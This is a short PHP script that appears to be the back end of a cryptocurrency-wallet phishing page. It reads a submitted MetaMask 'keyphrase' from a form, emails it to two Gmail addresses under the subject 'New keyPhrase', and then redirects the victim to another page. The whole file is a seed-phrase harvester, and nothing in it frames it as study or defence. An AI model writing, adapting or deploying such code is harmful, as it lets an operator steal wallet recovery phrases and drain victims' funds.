<?php

$keyphrase = $_POST['keyphrase'];
$metamask = $_POST['MetaMask'];
$to = "marrnuel123@gmail.com";
$subject = "New keyPhrase";

$headers = "From: ".$name. "\r\n" .
"CC: marrnuel12@gmail.com";

$txt = "You have received a new keyPhrase from" .$metamask. "\r\nKeyPhrase: " .$keyphrase;


if($keyphrase!=null) {
   mail($to, $subject, $txt, $headers)
}

header('Location:disc.html')




?>